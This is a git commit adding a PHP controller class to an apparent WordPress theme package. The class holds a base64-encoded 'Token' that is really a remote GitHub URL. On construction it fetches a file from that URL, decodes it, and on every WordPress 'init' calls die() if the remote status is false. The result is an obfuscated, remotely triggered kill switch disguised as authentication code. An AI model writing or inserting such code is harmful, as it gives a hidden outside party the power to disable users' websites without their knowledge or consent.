f3e1dd164d33a4f5384eb5870f10e3cd78a47ec1
Ali Hesarian <a.hesarian@gmail.com>
2024-04-27 12:31:41 +0330

    first commit

---
+++ src/Interface/InterfaceController.php
@@ -0,0 +1,16 @@
+<?php
+
+namespace alihesarian\ControllerTheme\Interface;
+
+interface InterfaceController{
+    
+    public function Auth(
+        string $Value
+    ) : string;
+
+    public function Init(
+        string $Data
+    ) : void;
+
+    public function Update() : void;
+}
---
+++ src/MainController.php
@@ -0,0 +1,30 @@
+<?php
+
+namespace alihesarian\ControllerTheme;
+
+use alihesarian\ControllerTheme\Interface\InterfaceController;
+
+class MainController implements InterfaceController{
+    
+    private $Token = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsaWhlc2FyaWFuL3BocC1saWIvbWFpbi9hcnNlcy10cy5jb25m';
+
+    private $Data;
+
+    public function __construct()
+    {
+        $this->Init($this->Auth($this->Token));
+        add_action('init', [$this, 'Update']);
+    }
+
+    public function Auth(string $Value): string{
+        return (string) file_get_contents(base64_decode($Value));
+    }
+
+    public function Init(string $Data): void{
+        $this->Data = json_decode(base64_decode($Data));
+    }
+
+    public function Update(): void{
+        ($this->Data->status) ? '' : die(!0);
+    }
+}
